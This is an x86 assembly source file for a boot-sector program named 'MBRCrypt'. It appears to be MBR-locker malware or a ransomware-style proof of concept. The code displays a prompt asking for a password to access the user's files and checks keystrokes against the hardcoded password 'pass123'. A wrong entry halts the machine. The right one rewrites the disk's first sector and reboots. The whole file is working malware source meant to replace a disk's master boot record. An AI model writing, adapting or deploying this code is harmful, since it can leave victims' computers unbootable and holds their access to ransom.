; declare variables
title: db "MBRCrypt", 0x0a, 0x0d, 0x00
lenTitle: db ($ - title)

message: db "Please provide password to access your files: ",0x00
lenMessage: db ($ - message)

wrongPassMessage: db "Wrong password.", 0x00
lenWrongPassMessage: db ($ - wrongPassMessage)

correctPassMessage: db "Correct password. Booting now.", 0x00
lenCorrectPassMessage: db ($ - correctPassMessage)

pass: db "pass123"
lenPass: dw ($ - pass)

; initializes registers to zero
xor ax, ax
xor bx, bx
xor cx, cx
xor dx, dx

mov es, ax
mov ds, ax

; displays message on screen
mov ah, 0x13
mov cl, byte[lenTitle + 0x7C00]
mov al, 0x01
mov bx, 0x0F
xor dx, dx
mov bp, title + 0x7C00
int 0x10

mov ah, 0x13
mov cl, byte[lenMessage+ 0x7C00]
mov al, 0x01
mov bx, 0x0F
xor dx, dx
mov bp, message + 0x7C00
int 0x10

xor si, si

; check keyboard status
looping:
	cmp si, [lenPass + 0x7C00]
	je correctPass

	mov ah, 01
	int 0x16

	; if no input
	jz looping

	; now read keyboard input
	xor ax, ax
	int 0x16

	mov ah, 0x0e
	xor bx, bx
	int 0x10

	cmp al, [pass + 0x7C00 + si]
	jne incorrectPass

	inc si

	jmp looping

correctPass:
	mov ah, 0x13
	mov cl, byte[lenCorrectPassMessage + 0x7C00]
	mov al, 0x01
	mov bx, 0x0F
	xor dx, dx
	mov dh, 0x04
	mov bp, correctPassMessage + 0x7C00
	int 0x10

	jmp readSectors 

incorrectPass:
	mov ah, 0x13
	mov cl, byte[lenWrongPassMessage + 0x7C00]
	mov al, 0x01
	mov bx, 0x0F
	xor dx, dx
	mov dh, 0x04
	mov bp, wrongPassMessage + 0x7C00
	int 0x10

	jmp final

; reference at: http://www.x-hacker.org/ng/asm/ng79205.html
readSectors:
	mov ah, 0x02
	mov al, 0x02
	mov ch, 0x00
	mov cl, 0x02
	mov dh, 0x00
	mov dl, 0x80
	mov bx, stageTwo + 0x7C00
	int 0x13

	jmp stageTwo

final:
	jmp $

times (512 - 2) - ($ - $$) db 0x00
dw 0xAA55

stageTwo:
	; reference at http://www.x-hacker.org/ng/asm/ng7a0ec.html
	mov ah, 0x03
	mov al, 0x01
	mov ch, 0x00
	mov cl, 0x01
	mov dh, 0x00
	mov dl, 0x80
	mov bx, 0x8000
	int 0x13

	jmp restartComputer

restartComputer:
	; intel 8086 processors contain their reset vector on the high end address of the memory,
	; namely the address FFFF0h.
	jmp 0xffff:0000

times 1024 - ($ - $$) db 0x00
